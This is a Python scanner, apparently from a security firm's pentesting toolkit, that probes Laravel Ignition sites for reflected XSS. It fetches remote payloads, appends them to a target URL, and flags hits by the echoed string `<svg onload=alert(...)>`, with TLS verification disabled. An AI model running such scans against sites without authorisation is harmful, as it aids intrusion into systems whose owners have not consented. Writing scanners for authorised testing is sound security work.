#!/usr/bin/env python

"""
 * laravel-ignition-Rxss
 * laravel-ignition-Rxss Bug scanner for WebPentesters and Bugbounty Hunters
 *
 * @Developed By Cappricio Securities <https://cappriciosec.com>
 */
 
"""
from laravelignitionrxss.includes import bot
from laravelignitionrxss.utils import configure
import json
import requests
import urllib.parse
from urllib3.exceptions import InsecureRequestWarning
from urllib.parse import quote
from laravelignitionrxss.includes import writefile
from laravelignitionrxss.utils import const
from urllib.parse import urlparse


requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def cvescan(url, output):
    try:
        with requests.Session() as session:
            payreq = session.get(const.Data.payloadurl)
            for endpoint in payreq.text.splitlines():
                encode = quote(endpoint)
                if url.endswith('/'):
                    url = url[:-1]
                fullurl = f'{url}/{endpoint}'
                try:
                    response = session.get(
                        fullurl, verify=False, data=payreq, headers=const.Data.rheaders, allow_redirects=False, timeout=5)
                    print(f'Checking ===> {fullurl}')
                    if response.status_code == 500 and "Undefined index: --><svg onload=alert('cappriciosec.com')>" in response.text:
                        outputprint = (
                            f"\n{const.Colors.RED}💸[Vulnerable]{const.Colors.RESET} ======> "
                            f"{const.Colors.BLUE}{url}{const.Colors.RESET} \n"
                            f"{const.Colors.MAGENTA}📸PoC-Url->{const.Colors.BLUE}${const.Colors.RESET} {fullurl}\n\n\n")
                        print(outputprint)
                        if configure.check_id() == "Exist":
                            bot.sendmessage(fullurl)
                        if output is not None:
                            writefile.writedata(
                                output, str(f'{fullurl}\n'))
                        break
                except requests.exceptions.RequestException as e:
                    print(
                        f'{const.Colors.MAGENTA}Invalid Domain ->{const.Colors.BLUE}${const.Colors.RESET} {fullurl}: {e}')
    except requests.exceptions.RequestException as e:
        print(f"Check Network Connection: {e}")
